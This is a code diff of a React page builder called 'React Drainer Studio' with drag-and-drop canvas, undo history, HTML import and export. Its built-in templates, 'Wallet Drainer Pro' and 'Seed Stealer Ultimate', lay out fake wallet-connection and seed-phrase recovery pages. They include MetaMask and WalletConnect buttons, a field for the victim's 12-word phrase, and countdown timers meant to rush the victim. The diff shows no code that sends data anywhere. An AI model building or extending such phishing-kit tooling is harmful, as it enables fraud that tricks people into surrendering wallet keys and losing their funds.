@@ -3,9 +3,7 @@ import { Element, HistoryState, Template } from './types/Element';
 import { Sidebar } from './components/Sidebar';
 import { Canvas } from './components/Canvas';
 import { PropertyPanel } from './components/PropertyPanel';
-import { StatusBar } from './components/StatusBar';
 import { generateHTML, downloadHTML } from './utils/exportHTML';
-import { parseHTMLToElements } from './utils/parseHTML';
 
 const createDefaultElement = (type: Element['type'], x: number, y: number): Element => {
   const baseElement = {
@@ -15,7 +13,7 @@ const createDefaultElement = (type: Element['type'], x: number, y: number): Elem
     width: 150,
     height: 40,
     text: type.charAt(0).toUpperCase() + type.slice(1),
-    color: '#ffffff',
+    color: '#00ffff',
     backgroundColor: '#1a1a2e',
     rotation: 0,
     opacity: 1,
@@ -30,25 +28,25 @@ const createDefaultElement = (type: Element['type'], x: number, y: number): Elem
 
   switch (type) {
     case 'button':
-      return { ...baseElement, width: 120, height: 40, backgroundColor: '#00ffff', color: '#000000' };
+      return { ...baseElement, width: 120, height: 40, backgroundColor: '#ff00ff', text: 'CONNECT' };
     case 'input':
-      return { ...baseElement, width: 200, height: 40, backgroundColor: 'rgba(0, 0, 0, 0.5)' };
+      return { ...baseElement, width: 200, height: 40, backgroundColor: '#0a0a0a', text: 'Enter address...' };
     case 'text':
-      return { ...baseElement, width: 200, height: 30, backgroundColor: 'transparent', fontSize: 18 };
-    case 'timer':
-      return { ...baseElement, width: 100, height: 40, text: '⏱️ 00:00', backgroundColor: 'transparent' };
-    case 'progress':
-      return { ...baseElement, width: 200, height: 20, text: 'Progress' };
-    case 'qr':
-      return { ...baseElement, width: 120, height: 120, text: 'QR Code' };
-    case 'social':
-      return { ...baseElement, width: 100, height: 40, text: 'Social' };
-    case 'slider':
-      return { ...baseElement, width: 150, height: 30, text: 'Slider' };
-    case 'toggle':
-      return { ...baseElement, width: 60, height: 30, text: 'Toggle' };
+      return { ...baseElement, width: 250, height: 30, text: 'Welcome to Drainer Studio', fontSize: 18 };
     case 'image':
-      return { ...baseElement, width: 150, height: 150, text: 'Image' };
+      return { ...baseElement, width: 100, height: 100, text: '🖼️ Image' };
+    case 'timer':
+      return { ...baseElement, width: 150, height: 50, text: '⏱️ 00:59', backgroundColor: '#ff0080' };
+    case 'progress':
+      return { ...baseElement, width: 200, height: 20, text: 'Loading...', backgroundColor: '#00ff00' };
+    case 'qr':
+      return { ...baseElement, width: 120, height: 120, text: '📱 QR Code' };
+    case 'social':
+      return { ...baseElement, width: 180, height: 40, text: '🔗 Connect Social' };
+    case 'slider':
+      return { ...baseElement, width: 150, height: 40, text: '🎚️ Slider' };
+    case 'toggle':
+      return { ...baseElement, width: 60, height: 30, text: '🔘' };
     default:
       return baseElement;
   }
@@ -56,144 +54,44 @@ const createDefaultElement = (type: Element['type'], x: number, y: number): Elem
 
 const templates: Template[] = [
   {
+    id: 'wallet-drainer',
     name: 'Wallet Drainer Pro',
+    description: 'Professional wallet connection interface',
     elements: [
-      {
-        type: 'text',
-        x: 400,
-        y: 100,
-        width: 400,
-        height: 60,
-        text: 'CONNECT WALLET',
-        color: '#ffffff',
-        backgroundColor: 'transparent',
-        rotation: 0,
-        opacity: 1,
-        borderRadius: 0,
-        fontSize: 36,
-        fontWeight: '900',
-        borderStyle: 'none',
-        borderColor: '#000000',
-        borderWidth: 0,
-        zIndex: 1,
-      },
-      {
-        type: 'button',
-        x: 450,
-        y: 250,
-        width: 300,
-        height: 60,
-        text: 'METAMASK',
-        color: '#000000',
-        backgroundColor: '#f6851b',
-        rotation: 0,
-        opacity: 1,
-        borderRadius: 8,
-        fontSize: 18,
-        fontWeight: 'bold',
-        borderStyle: 'none',
-        borderColor: '#000000',
-        borderWidth: 0,
-        zIndex: 2,
-      },
-      {
-        type: 'timer',
-        x: 550,
-        y: 400,
-        width: 100,
-        height: 40,
-        text: '⏱️ 02:00',
-        color: '#ffffff',
-        backgroundColor: 'transparent',
-        rotation: 0,
-        opacity: 1,
-        borderRadius: 0,
-        fontSize: 20,
-        fontWeight: '900',
-        borderStyle: 'none',
-        borderColor: '#000000',
-        borderWidth: 0,
-        zIndex: 3,
-      },
-    ],
+      { type: 'text', x: 200, y: 50, text: 'Connect Your Wallet', fontSize: 24, color: '#00ffff' },
+      { type: 'button', x: 200, y: 150, text: 'METAMASK', backgroundColor: '#ff6b35' },
+      { type: 'button', x: 200, y: 200, text: 'WALLETCONNECT', backgroundColor: '#3b99fc' },
+      { type: 'input', x: 200, y: 250, text: '0x...', width: 300 },
+      { type: 'timer', x: 200, y: 320, text: '⏱️ 02:00' },
+    ]
   },
   {
+    id: 'seed-stealer',
     name: 'Seed Stealer Ultimate',
+    description: 'Seed phrase recovery interface',
     elements: [
-      {
-        type: 'text',
-        x: 350,
-        y: 80,
-        width: 500,
-        height: 80,
-        text: 'RECOVER YOUR SEED PHRASE',
-        color: '#ffffff',
-        backgroundColor: 'transparent',
-        rotation: 0,
-        opacity: 1,
-        borderRadius: 0,
-        fontSize: 32,
-        fontWeight: '900',
-        borderStyle: 'none',
-        borderColor: '#000000',
-        borderWidth: 0,
-        zIndex: 1,
-      },
-      {
-        type: 'input',
-        x: 350,
-        y: 200,
-        width: 500,
-        height: 50,
-        text: 'Enter 12-word seed phrase...',
-        color: '#ffffff',
-        backgroundColor: 'rgba(0, 0, 0, 0.5)',
-        rotation: 0,
-        opacity: 1,
-        borderRadius: 8,
-        fontSize: 16,
-        fontWeight: 'normal',
-        borderStyle: 'solid',
-        borderColor: '#00ffff',
-        borderWidth: 2,
-        zIndex: 2,
-      },
-      {
-        type: 'button',
-        x: 450,
-        y: 300,
-        width: 300,
-        height: 60,
-        text: 'RECOVER NOW',
-        color: '#ffffff',
-        backgroundColor: 'linear-gradient(45deg, #00ffff, #ff00ff)',
-        rotation: 0,
-        opacity: 1,
-        borderRadius: 12,
-        fontSize: 20,
-        fontWeight: 'bold',
-        borderStyle: 'none',
-        borderColor: '#000000',
-        borderWidth: 0,
-        zIndex: 3,
-      },
-    ],
-  },
+      { type: 'text', x: 200, y: 50, text: 'Enter Your Seed Phrase', fontSize: 20, color: '#ff00ff' },
+      { type: 'input', x: 200, y: 100, text: 'word1 word2 word3...', width: 350, height: 80 },
+      { type: 'button', x: 200, y: 200, text: 'RECOVER WALLET', backgroundColor: '#00ff00' },
+      { type: 'progress', x: 200, y: 250, text: 'Scanning...', width: 250 },
+      { type: 'qr', x: 400, y: 100 },
+    ]
+  }
 ];
 
 export default function App() {
   const [elements, setElements] = useState<Element[]>([]);
   const [selectedId, setSelectedId] = useState<string | null>(null);
-  const [draggedType, setDraggedType] = useState<Element['type'] | null>(null);
-  const [zoom, setZoom] = useState(1);
-  const [showGrid, setShowGrid] = useState(true);
-  const [backgroundImage, setBackgroundImage] = useState<string | null>(null);
   const [history, setHistory] = useState<HistoryState[]>([]);
   const [historyIndex, setHistoryIndex] = useState(-1);
-  const [mousePosition, setMousePosition] = useState({ x: 0, y: 0 });
-  const [isDragging, setIsDragging] = useState(false);
-  const [draggedElementId, setDraggedElementId] = useState<string | null>(null);
-  const [dragOffset, setDragOffset] = useState({ x: 0, y: 0 });
+  const [zoom, setZoom] = useState(1);
+  const [showGrid, setShowGrid] = useState(true);
+  const [backgroundImage, setBackgroundImage] = useState<string>('');
+  const [draggedType, setDraggedType] = useState<Element['type'] | null>(null);
+  const [activeTab, setActiveTab] = useState<'elements' | 'templates' | 'layers' | 'controls'>('elements');
+  const [mousePos, setMousePos] = useState({ x: 0, y: 0 });
+
+  const canvasRef = useRef<HTMLDivElement>(null);
 
   const saveToHistory = useCallback(() => {
     const newState: HistoryState = {
@@ -212,7 +110,20 @@ export default function App() {
     setHistoryIndex(newHistory.length - 1);
   }, [elements, selectedId, history, historyIndex]);
 
-  const undo = useCallback(() => {
+  const updateElement = useCallback((id: string, updates: Partial<Element>) => {
+    setElements(prev => prev.map(el => 
+      el.id === id ? { ...el, ...updates } : el
+    ));
+    saveToHistory();
+  }, [saveToHistory]);
+
+  const deleteElement = useCallback((id: string) => {
+    setElements(prev => prev.filter(el => el.id !== id));
+    setSelectedId(null);
+    saveToHistory();
+  }, [saveToHistory]);
+
+  const handleUndo = useCallback(() => {
     if (historyIndex > 0) {
       const prevState = history[historyIndex - 1];
       setElements(prevState.elements);
@@ -221,7 +132,7 @@ export default function App() {
     }
   }, [history, historyIndex]);
 
-  const redo = useCallback(() => {
+  const handleRedo = useCallback(() => {
     if (historyIndex < history.length - 1) {
       const nextState = history[historyIndex + 1];
       setElements(nextState.elements);
@@ -234,9 +145,17 @@ export default function App() {
     setDraggedType(type);
   };
 
-  const handleDrop = (e: React.DragEvent, x: number, y: number) => {
+  const handleDragOver = (e: React.DragEvent) => {
     e.preventDefault();
-    if (!draggedType) return;
+  };
+
+  const handleDrop = (e: React.DragEvent) => {
+    e.preventDefault();
+    if (!draggedType || !canvasRef.current) return;
+
+    const rect = canvasRef.current.getBoundingClientRect();
+    const x = (e.clientX - rect.left) / zoom;
+    const y = (e.clientY - rect.top) / zoom;
 
     const newElement = createDefaultElement(draggedType, x, y);
     setElements(prev => [...prev, newElement]);
@@ -245,175 +164,335 @@ export default function App() {
     saveToHistory();
   };
 
-  const handleElementClick = (id: string) => {
-    setSelectedId(id);
-  };
-
-  const handleElementMouseDown = (e: React.MouseEvent, id: string) => {
-    e.preventDefault();
-    e.stopPropagation();
-    
-    const element = elements.find(el => el.id === id);
-    if (!element) return;
-
-    const rect = e.currentTarget.getBoundingClientRect();
-    setDragOffset({
-      x: e.clientX - rect.left,
-      y: e.clientY - rect.top,
-    });
-    
-    setIsDragging(true);
-    setDraggedElementId(id);
-    setSelectedId(id);
-  };
-
-  const handleMouseMove = useCallback((e: React.MouseEvent) => {
-    const canvas = e.currentTarget;
-    const rect = canvas.getBoundingClientRect();
-    const x = Math.round((e.clientX - rect.left) / zoom);
-    const y = Math.round((e.clientY - rect.top) / zoom);
-    setMousePosition({ x, y });
-
-    if (isDragging && draggedElementId) {
-      const element = elements.find(el => el.id === draggedElementId);
-      if (!element) return;
-
-      const newX = Math.max(0, Math.min(x - dragOffset.x, rect.width / zoom - element.width));
-      const newY = Math.max(0, Math.min(y - dragOffset.y, rect.height / zoom - element.height));
-
-      setElements(prev => prev.map(el => 
-        el.id === draggedElementId ? { ...el, x: newX, y: newY } : el
-      ));
-    }
-  }, [isDragging, draggedElementId, elements, zoom, dragOffset]);
-
-  const handleMouseUp = useCallback(() => {
-    if (isDragging) {
-      setIsDragging(false);
-      setDraggedElementId(null);
-      saveToHistory();
-    }
-  }, [isDragging, saveToHistory]);
-
-  const handleElementUpdate = (updates: Partial<Element>) => {
-    if (!selectedId) return;
-    
-    setElements(prev => prev.map(el => 
-      el.id === selectedId ? { ...el, ...updates } : el
-    ));
-    saveToHistory();
-  };
-
-  const handleElementDelete = () => {
-    if (!selectedId) return;
-    
-    setElements(prev => prev.filter(el => el.id !== selectedId));
-    setSelectedId(null);
-    saveToHistory();
-  };
-
-  const handleBackgroundUpload = (e: React.ChangeEvent<HTMLInputElement>) => {
-    const file = e.target.files?.[0];
-    if (file && file.type.startsWith('image/')) {
-      const reader = new FileReader();
-      reader.onload = (event) => {
-        setBackgroundImage(event.target?.result as string);
-      };
-      reader.readAsDataURL(file);
-    }
-  };
-
-  const handleHTMLUpload = (e: React.ChangeEvent<HTMLInputElement>) => {
-    const file = e.target.files?.[0];
-    if (file && file.type === 'text/html') {
-      const reader = new FileReader();
-      reader.onload = (event) => {
-        const htmlContent = event.target?.result as string;
-        const parsedElements = parseHTMLToElements(htmlContent);
-        if (parsedElements.length > 0) {
-          setElements(parsedElements);
-          setSelectedId(null);
-          saveToHistory();
-        }
-      };
-      reader.readAsText(file);
-    }
-  };
-
-  const handleTemplateLoad = (template: Template) => {
-    const newElements = template.elements.map(el => ({
+  const loadTemplate = (template: Template) => {
+    const newElements = template.elements.map((el, index) => ({
+      ...createDefaultElement(el.type, el.x, el.y),
       ...el,
-      id: `element-${Date.now()}-${Math.random().toString(36).substr(2, 9)}`,
+      id: `template-${Date.now()}-${index}`,
     }));
     setElements(newElements);
     setSelectedId(null);
     saveToHistory();
   };
 
+  // 🎨 DESIGN-ONLY HTML Import Function
+  const handleHTMLImport = useCallback((html: string) => {
+    try {
+      // Create a temporary DOM element to parse HTML
+      const tempDiv = document.createElement('div');
+      tempDiv.innerHTML = html;
+
+      const extractedElements: Element[] = [];
+      let yOffset = 50;
+
+      // 🎨 Extract ONLY visual text elements (headings, paragraphs)
+      const textElements = tempDiv.querySelectorAll('h1, h2, h3, h4, h5, h6, p, div, span');
+      textElements.forEach((element, index) => {
+        const text = element.textContent?.trim();
+        if (text && text.length > 0 && text.length < 150 && !element.querySelector('button, input, a, form')) {
+          const computedStyle = window.getComputedStyle(element);
+          const tagName = element.tagName.toLowerCase();
+          let fontSize = 16;
+          
+          // Set font sizes based on tag
+          switch (tagName) {
+            case 'h1': fontSize = 32; break;
+            case 'h2': fontSize = 24; break;
+            case 'h3': fontSize = 20; break;
+            case 'h4': fontSize = 18; break;
+            case 'h5': fontSize = 16; break;
+            case 'h6': fontSize = 14; break;
+            default: fontSize = parseInt(computedStyle.fontSize) || 16;
+          }
+          
+          // Convert colors to hex format
+          const color = computedStyle.color;
+          const backgroundColor = computedStyle.backgroundColor;
+          
+          extractedElements.push({
+            id: `imported-text-${Date.now()}-${index}`,
+            type: 'text',
+            x: 200,
+            y: yOffset,
+            width: 300,
+            height: Math.max(30, fontSize + 10),
+            text: text,
+            color: color || '#00ffff',
+            backgroundColor: backgroundColor === 'rgba(0, 0, 0, 0)' ? 'transparent' : backgroundColor,
+            rotation: 0,
+            opacity: parseFloat(computedStyle.opacity) || 1,
+            borderRadius: 0,
+            fontSize: fontSize,
+            fontWeight: computedStyle.fontWeight || 'normal',
+            borderStyle: 'none',
+            borderColor: 'transparent',
+            borderWidth: 0,
+            zIndex: 1,
+          });
+          yOffset += 50;
+        }
+      });
+
+      // 🎨 Extract ONLY visual images (no functional elements)
+      const images = tempDiv.querySelectorAll('img');
+      images.forEach((img, index) => {
+        // Skip if image is inside a button, link or form
+        const parent = img.closest('button, a, form');
+        if (!parent) {
+          const rect = img.getBoundingClientRect();
+          
+          extractedElements.push({
+            id: `imported-image-${Date.now()}-${index}`,
+            type: 'image',
+            x: 200,
+            y: yOffset,
+            width: Math.max(rect.width, 100),
+            height: Math.max(rect.height, 100),
+            text: img.alt || '🖼️ Image',
+            color: '#ffffff',
+            backgroundColor: '#374151',
+            rotation: 0,
+            opacity: 1,
+            borderRadius: 4,
+            fontSize: 14,
+            fontWeight: 'normal',
+            borderStyle: 'solid',
+            borderColor: '#00ffff',
+            borderWidth: 1,
+            zIndex: 1,
+          });
+          yOffset += 120;
+        }
+      });
+
+      // 🎨 Extract ONLY decorative buttons (no forms, no links)
+      const buttons = tempDiv.querySelectorAll('button');
+      buttons.forEach((button, index) => {
+        // Skip if button is inside a form
+        const parentForm = button.closest('form');
+        if (!parentForm) {
+          const computedStyle = window.getComputedStyle(button);
+          const rect = button.getBoundingClientRect();
+          
+          extractedElements.push({
+            id: `imported-button-${Date.now()}-${index}`,
+            type: 'button',
+            x: 200,
+            y: yOffset,
+            width: Math.max(rect.width, 120),
+            height: Math.max(rect.height, 40),
+            text: button.textContent || 'Button',
+            color: computedStyle.color || '#ffffff',
+            backgroundColor: computedStyle.backgroundColor || '#ff00ff',
+            rotation: 0,
+            opacity: parseFloat(computedStyle.opacity) || 1,
+            borderRadius: 4,
+            fontSize: parseInt(computedStyle.fontSize) || 14,
+            fontWeight: computedStyle.fontWeight || 'normal',
+            borderStyle: 'solid',
+            borderColor: computedStyle.borderColor || '#00ffff',
+            borderWidth: parseInt(computedStyle.borderWidth) || 1,
+            zIndex: 1,
+          });
+          yOffset += 60;
+        }
+      });
+
+      // 🎨 Extract ONLY visual input fields (no forms)
+      const inputs = tempDiv.querySelectorAll('input[type="text"], input[type="email"], input[type="password"], input[type="search"]');
+      inputs.forEach((input, index) => {
+        // Skip if input is inside a form
+        const parentForm = input.closest('form');
+        if (!parentForm) {
+          const computedStyle = window.getComputedStyle(input);
+          const rect = input.getBoundingClientRect();
+          
+          extractedElements.push({
+            id: `imported-input-${Date.now()}-${index}`,
+            type: 'input',
+            x: 200,
+            y: yOffset,
+            width: Math.max(rect.width, 200),
+            height: Math.max(rect.height, 40),
+            text: input.placeholder || input.value || 'Input field',
+            color: computedStyle.color || '#ffffff',
+            backgroundColor: computedStyle.backgroundColor || '#0a0a0a',
+            rotation: 0,
+            opacity: parseFloat(computedStyle.opacity) || 1,
+            borderRadius: 4,
+            fontSize: parseInt(computedStyle.fontSize) || 14,
+            fontWeight: computedStyle.fontWeight || 'normal',
+            borderStyle: 'solid',
+            borderColor: computedStyle.borderColor || '#00ffff',
+            borderWidth: parseInt(computedStyle.borderWidth) || 1,
+            zIndex: 1,
+          });
+          yOffset += 60;
+        }
+      });
+
+      // 🎨 Extract ONLY decorative divs with background colors or borders
+      const decorativeDivs = tempDiv.querySelectorAll('div');
+      decorativeDivs.forEach((div, index) => {
+        const computedStyle = window.getComputedStyle(div);
+        const hasVisualStyle = 
+          computedStyle.backgroundColor !== 'rgba(0, 0, 0, 0)' ||
+          computedStyle.border !== '0px none rgb(0, 0, 0)' ||
+          computedStyle.borderRadius !== '0px';
+        
+        // Skip if div contains functional elements or is empty
+        const hasFunctionalContent = div.querySelector('button, input, a, form, select, textarea');
+        const hasText = div.textContent?.trim().length || 0;
+        
+        if (hasVisualStyle && !hasFunctionalContent && hasText < 50) {
+          const rect = div.getBoundingClientRect();
+          
+          extractedElements.push({
+            id: `imported-div-${Date.now()}-${index}`,
+            type: 'text',
+            x: 200,
+            y: yOffset,
+            width: Math.max(rect.width, 150),
+            height: Math.max(rect.height, 40),
+            text: div.textContent?.trim() || 'Decorative Element',
+            color: computedStyle.color || '#ffffff',
+            backgroundColor: computedStyle.backgroundColor || '#1a1a2e',
+            rotation: 0,
+            opacity: parseFloat(computedStyle.opacity) || 1,
+            borderRadius: parseInt(computedStyle.borderRadius) || 4,
+            fontSize: parseInt(computedStyle.fontSize) || 14,
+            fontWeight: computedStyle.fontWeight || 'normal',
+            borderStyle: 'solid',
+            borderColor: computedStyle.borderColor || '#00ffff',
+            borderWidth: parseInt(computedStyle.borderWidth) || 1,
+            zIndex: 1,
+          });
+          yOffset += 60;
+        }
+      });
+
+      if (extractedElements.length > 0) {
+        setElements(extractedElements);
+        setSelectedId(null);
+        saveToHistory();
+        console.log(`✅ Imported ${extractedElements.length} design elements from HTML`);
+      } else {
+        console.log('⚠️ No design elements found in HTML');
+      }
+    } catch (error) {
+      console.error('❌ Error parsing HTML:', error);
+    }
+  }, [saveToHistory]);
+
   const handleExport = () => {
-    const htmlContent = generateHTML(elements, backgroundImage);
-    downloadHTML(htmlContent);
+    const html = generateHTML(elements, backgroundImage);
+    downloadHTML(html);
   };
 
-  const selectedElement = elements.find(el => el.id === selectedId);
+  const handleCanvasMouseMove = (e: React.MouseEvent) => {
+    if (!canvasRef.current) return;
+    const rect = canvasRef.current.getBoundingClientRect();
+    const x = Math.round(e.clientX - rect.left);
+    const y = Math.round(e.clientY - rect.top);
+    setMousePos({ x, y });
+  };
 
   useEffect(() => {
-    if (elements.length > 0 && history.length === 0) {
-      saveToHistory();
-    }
-  }, []);
+    const handleKeyDown = (e: KeyboardEvent) => {
+      if (e.ctrlKey || e.metaKey) {
+        if (e.key === 'z' && !e.shiftKey) {
+          e.preventDefault();
+          handleUndo();
+        } else if ((e.key === 'y') || (e.key === 'z' && e.shiftKey)) {
+          e.preventDefault();
+          handleRedo();
+        }
+      } else if (e.key === 'Delete' && selectedId) {
+        deleteElement(selectedId);
+      }
+    };
+
+    window.addEventListener('keydown', handleKeyDown);
+    return () => window.removeEventListener('keydown', handleKeyDown);
+  }, [selectedId, handleUndo, handleRedo, deleteElement]);
 
   return (
-    <div className="h-screen bg-gray-950 flex flex-col">
-      <div className="flex flex-1 overflow-hidden">
-        <Sidebar
-          elements={elements}
-          selectedId={selectedId}
-          zoom={zoom}
-          showGrid={showGrid}
-          onDragStart={handleDragStart}
-          onZoomChange={setZoom}
-          onToggleGrid={() => setShowGrid(!showGrid)}
-          onUndo={undo}
-          onRedo={redo}
-          onExport={handleExport}
-          onBackgroundUpload={handleBackgroundUpload}
-          onHTMLUpload={handleHTMLUpload}
-          onTemplateLoad={handleTemplateLoad}
-          onElementSelect={handleElementClick}
-          canUndo={historyIndex > 0}
-          canRedo={historyIndex < history.length - 1}
-        />
-        
-        <Canvas
-          elements={elements}
-          selectedId={selectedId}
-          zoom={zoom}
-          showGrid={showGrid}
-          backgroundImage={backgroundImage}
-          isDragging={isDragging}
-          onElementClick={handleElementClick}
-          onElementMouseDown={handleElementMouseDown}
-          onMouseMove={handleMouseMove}
-          onMouseUp={handleMouseUp}
-          onDrop={handleDrop}
-        />
-        
-        {selectedElement && (
-          <PropertyPanel
-            element={selectedElement}
-            onUpdate={handleElementUpdate}
-            onDelete={handleElementDelete}
-          />
-        )}
-      </div>
-      
-      <StatusBar
-        elementCount={elements.length}
+    <div className="flex h-screen bg-black text-white font-mono overflow-hidden">
+      {/* Sidebar */}
+      <Sidebar
+        activeTab={activeTab}
+        setActiveTab={setActiveTab}
+        elements={elements}
         selectedId={selectedId}
+        setSelectedId={setSelectedId}
+        templates={templates}
+        loadTemplate={loadTemplate}
+        handleDragStart={handleDragStart}
         zoom={zoom}
-        mousePosition={mousePosition}
+        setZoom={setZoom}
+        showGrid={showGrid}
+        setShowGrid={setShowGrid}
+        backgroundImage={backgroundImage}
+        setBackgroundImage={setBackgroundImage}
+        handleUndo={handleUndo}
+        handleRedo={handleRedo}
+        canUndo={historyIndex > 0}
+        canRedo={historyIndex < history.length - 1}
+        handleExport={handleExport}
+        handleHTMLImport={handleHTMLImport}
       />
+
+      {/* Main Canvas Area */}
+      <div className="flex-1 flex flex-col">
+        {/* Top Bar */}
+        <div className="h-12 bg-gray-900 border-b border-cyan-500/30 flex items-center justify-between px-4">
+          <div className="flex items-center space-x-4">
+            <h1 className="text-cyan-400 font-bold text-lg">⚡ React Drainer Studio v8.0 Ultimate</h1>
+            <div className="text-xs text-gray-400">
+              Elements: {elements.length} | Selected: {selectedId ? '✓' : '✗'} | Zoom: {Math.round(zoom * 100)}%
+            </div>
+          </div>
+          <div className="text-xs text-gray-400">
+            Mouse: {mousePos.x}, {mousePos.y}
+          </div>
+        </div>
+
+        {/* Canvas Container */}
+        <div className="flex-1 bg-gray-950 relative overflow-hidden">
+          <div
+            ref={canvasRef}
+            className="absolute inset-4 bg-gray-900 rounded-lg border border-cyan-500/20 overflow-hidden"
+            style={{
+              backgroundImage: backgroundImage ? `url(${backgroundImage})` : showGrid 
+                ? 'linear-gradient(rgba(0, 255, 255, 0.1) 1px, transparent 1px), linear-gradient(90deg, rgba(0, 255, 255, 0.1) 1px, transparent 1px)'
+                : 'none',
+              backgroundSize: backgroundImage ? 'cover' : '20px 20px',
+              transform: `scale(${zoom})`,
+              transformOrigin: 'top left',
+              cursor: draggedType ? 'copy' : 'default',
+            }}
+            onDragOver={handleDragOver}
+            onDrop={handleDrop}
+            onMouseMove={handleCanvasMouseMove}
+          >
+            <Canvas
+              elements={elements}
+              selectedId={selectedId}
+              setSelectedId={setSelectedId}
+              updateElement={updateElement}
+            />
+          </div>
+        </div>
+      </div>
+
+      {/* Property Panel */}
+      {selectedId && (
+        <PropertyPanel
+          element={elements.find(el => el.id === selectedId)!}
+          updateElement={updateElement}
+          deleteElement={deleteElement}
+        />
+      )}
     </div>
   );
 }
